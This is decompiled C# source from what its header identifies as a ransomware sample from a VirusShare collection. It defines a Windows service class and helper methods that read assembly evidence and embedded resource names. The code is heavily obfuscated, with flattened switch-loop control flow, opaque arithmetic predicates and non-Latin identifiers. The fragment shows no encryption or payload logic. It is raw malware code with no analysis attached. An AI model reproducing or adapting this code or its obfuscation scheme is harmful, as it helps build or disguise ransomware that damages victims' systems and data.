// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႳႷ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.Collections;
using System.ComponentModel;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.ServiceProcess;

namespace Ⴃ
{
  internal sealed class ႳႷ : ServiceBase
  {
    private IContainer Ⴈ;

    public ႳႷ() => this.Ⴍ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    protected override void Dispose([In] bool obj0)
    {
      char[] ⴗ = ႷႼ.Ⴗ;
      byte[] ⴐ = ႷႨ.Ⴐ;
      int num = 5;
      while (true)
      {
        switch (num)
        {
          case 0:
            num = this.Ⴈ == null ? (int) ⴗ[79] - 4290 : 3;
            continue;
          case 3:
            goto label_4;
          case 4:
            goto label_6;
          case 6:
            goto label_5;
          default:
            num = !obj0 ? (int) ⴐ[297] - 230 : (int) ⴗ[32] - (int) ⴗ[32];
            continue;
        }
      }
label_6:
      return;
label_4:
      this.Ⴈ.Dispose();
label_5:
      base.Dispose(obj0);
    }

    private void Ⴍ()
    {
      this.Ⴈ = (IContainer) new Container();
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႭႭ.Ⴈ(typeof (ႣႤ), 9L, 2, 1951761912), (short) 701, '˕');
    }

    static ႳႷ() => ႳႣ.Ⴅ();

    internal static Evidence Ⴃ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] char obj1, [In] short obj2) where \u0021\u00210 : Assembly
    {
      char[] ⴗ = ႷႼ.Ⴗ;
label_3:
      int num1 = 0;
      int num2 = 9;
      IEnumerable enumerable;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 4:
            ++num1;
            int num3 = (int) obj1;
            num2 = (num3 * num3 + (int) obj1) % 2 == 0 ? 11 : 8;
            continue;
          case 2:
            enumerable = (IEnumerable) obj0.Evidence;
            num2 = 1;
            continue;
          case 5:
            enumerable = (IEnumerable) null;
            num2 = 1;
            continue;
          case 6:
            num2 = 9;
            continue;
          case 8:
            num2 = (int) ⴗ[94] - 57010;
            continue;
          case 9:
            int num4;
            switch (((int) obj2 ^ (int) obj1) - (int) sbyte.MaxValue ^ num1)
            {
              case 0:
                num4 = 2;
                break;
              default:
                num4 = 5;
                break;
            }
            num2 = num4;
            continue;
          case 10:
            goto label_3;
          case 11:
            goto label_12;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႷ.Ⴃ);
            num2 = 10;
            continue;
        }
      }
label_12:
      return enumerable as Evidence;
    }

    internal static string[] Ⴄ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] int obj1, [In] short obj2) where \u0021\u00210 : Assembly
    {
      char[] ⴗ = ႷႼ.Ⴗ;
      byte[] ⴍ = ႣႣ.Ⴍ;
label_3:
      int num1 = 0;
      int num2 = 3;
      Array array;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 0:
            array = (Array) obj0.GetManifestResourceNames();
            num2 = 1;
            continue;
          case 1:
            ++num1;
            int num4 = (int) obj2;
            num3 = num4 * num4;
            goto case 8;
          case 2:
            num2 = 3;
            continue;
          case 3:
          case 6:
            int num5;
            switch (((int) obj2 ^ obj1) - 38 ^ num1)
            {
              case 0:
                num5 = (int) ⴗ[26] - 10604;
                break;
              default:
                num5 = 5;
                break;
            }
            num2 = num5;
            continue;
          case 4:
            num2 = num3 % 2 != 0 ? (int) ⴍ[11] - (int) ⴍ[45] : 11;
            continue;
          case 5:
          case 7:
            array = (Array) null;
            num2 = 1;
            continue;
          case 8:
            num3 = (int) obj2 + num3;
            num2 = 4;
            continue;
          case 10:
            goto label_3;
          case 11:
            goto label_13;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႷ.Ⴄ);
            num2 = (int) ⴗ[117] - 28530;
            continue;
        }
      }
label_13:
      return (string[]) array;
    }

    internal delegate int ႣႭ([In] byte[] obj0, [In] int obj1);
  }
}
